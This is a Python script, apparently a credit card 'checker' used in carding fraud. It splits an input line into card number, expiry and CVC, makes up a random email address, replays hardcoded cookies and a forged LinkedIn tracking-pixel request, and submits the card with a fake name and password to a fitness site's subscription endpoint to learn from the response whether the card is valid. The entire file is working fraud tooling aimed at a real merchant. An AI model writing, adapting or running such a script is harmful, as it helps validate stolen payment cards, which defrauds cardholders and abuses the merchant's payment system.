import requests
import random
import time
import user_agent
from user_agent import generate_user_agent
user_agent = generate_user_agent()
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	
	emil = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=17)) + '@gmail.com'
	
	
	cookies = {
				    'li_sugr': 'e09ffcb7-b77e-4097-b7ac-d3b5a1db1c0a',
				    'bcookie': '"v=2&862e192b-3866-46d2-8415-c4ef3e14965a"',
				    'UserMatchHistory': 'AQIz509os4R3XgAAAY61feNQ-3k182NkaHruGw_BZUV3a4VWH359j_t1zJmUD44v_Z5k88SnmHfCYA',
				    'AnalyticsSyncHistory': 'AQKVRT1i1r6mgQAAAY61feNQzPq-kUat55-IfTjXmmNP2iMSsx_yH6kFrPPFvfr13e7GItTLSZUHzDG2n0bFjw',
				    'lidc': '"b=VGST02:s=V:r=V:a=V:p=V:g=3189:u=1:x=1:i=1712490102:t=1712576502:v=2:sig=AQHTZ8jMxg9HeLynLdy_M7crYIXdVgKM"',
				}
				
	headers = {
				    'authority': 'px.ads.linkedin.com',
				    'accept': '*',
				    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
				    'content-type': 'text/plain;charset=UTF-8',
				    'origin': 'https://www.lagreeod.com',
				    'referer': 'https://www.lagreeod.com/',
				    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
				    'sec-ch-ua-mobile': '?0',
				    'sec-ch-ua-platform': '"Linux"',
				    'sec-fetch-dest': 'empty',
				    'sec-fetch-mode': 'cors',
				    'sec-fetch-site': 'cross-site',
				    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
				}
				
	data = '{"pids":[5143044],"scriptVersion":141,"time":1712492707072,"domain":"lagreeod.com","url":"https://lagreeod.com/subscribe","pageTitle":"Subcribe to Lagree Fitness On Demand | Virtual Lagree Fitness Classes - Lagree On Demand","websiteSignalRequestId":"fad86452-5f24-45dc-fd45-c44c1a3172a1","isTranslated":false,"liFatId":"","liGiant":"","misc":{"psbState":0},"isLinkedInApp":false,"hem":null,"signalType":"CLICK","href":"","domAttributes":{"elementSemanticType":null,"elementValue":null,"elementType":"submit","tagName":"BUTTON","backgroundImageSrc":null,"imageSrc":null,"imageAlt":null,"innerText":"START YOUR SUBSCRIPTION","elementTitle":null,"cursor":"pointer","formAction":"register/validate_subscribe","isFormSubmission":true},"innerElements":null,"elementCrumbsTree":[{"tagName":"main","nthChild":3,"id":"site-root"},{"tagName":"section","nthChild":0,"classes":["pb-100","pt-0","px-2"]},{"tagName":"div","nthChild":0,"classes":["container1080"]},{"tagName":"form","nthChild":1,"id":"register_subscribe","classes":["flex","nowrap","row"],"attributes":{"action":"register/validate_subscribe","data-gtm-form-interact-id":"0"}},{"tagName":"div","nthChild":2,"classes":["col","mb-mob-3","order-mob-1","pl-4","pr-0","px-mob-1","w100"]},{"tagName":"div","nthChild":0,"classes":["big-padding","border","for--loading","panel"]},{"tagName":"div","nthChild":12,"classes":["row","w100"]},{"tagName":"div","nthChild":0,"classes":["aic","col-12","flex","jcc","px-0"]},{"tagName":"button","nthChild":0,"classes":["black-bg","btn","btn-tall","btn-wide","f-14","w100","white"]}],"isFilteredByClient":false}'
				
	response = requests.post('https://px.ads.linkedin.com/wa/', cookies=cookies, headers=headers, data=data)
				
	cookies = {
				    '_ga': 'GA1.1.777105074.1711957370',
				    '_gcl_au': '1.1.886741420.1711957370',
				    'optiMonkClientId': '42b3177f-139d-a2f9-d22b-99dc134be88f',
				    'ci_session': 'b1u7jnha8ng1i77ilitv17id0it9bdmf',
				    '_ga_4HXMJ7D3T6': 'GS1.1.1712490097.3.1.1712490438.0.0.0',
				    '_ga_KQ5ZJRZGQR': 'GS1.1.1712490101.3.1.1712490570.0.0.0',
				}
				
	headers = {
				    'authority': 'www.lagreeod.com',
				    'accept': 'application/json, text/javascript, */*; q=0.01',
				    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
				    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
				    'origin': 'https://www.lagreeod.com',
				    'referer': 'https://www.lagreeod.com/subscribe',
				    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
				    'sec-ch-ua-mobile': '?0',
				    'sec-ch-ua-platform': '"Linux"',
				    'sec-fetch-dest': 'empty',
				    'sec-fetch-mode': 'cors',
				    'sec-fetch-site': 'same-origin',
				    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
				    'x-requested-with': 'XMLHttpRequest',
				}
				
	data = {
				    'stripe_customer': '',
				    'subscription_type': 'Weekly Subscription',
				    'firstname': 'Rosella',
				    'lastname': 'Rosenbaum',
				    'email':'a'+emil,
				    'password': '20056677',
				    'card[name]': 'ebrah',
				    'card[number]': n,
				    'card[exp_month]': mm,
				    'card[exp_year]': yy,
				    'card[cvc]': cvc,
				    'coupon': '',
				    's1': '19',
				    'sum': '26',
				}
				
	response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
	
		
	try:
		ii=(response.text)
	except:
		return 'success'
	return ii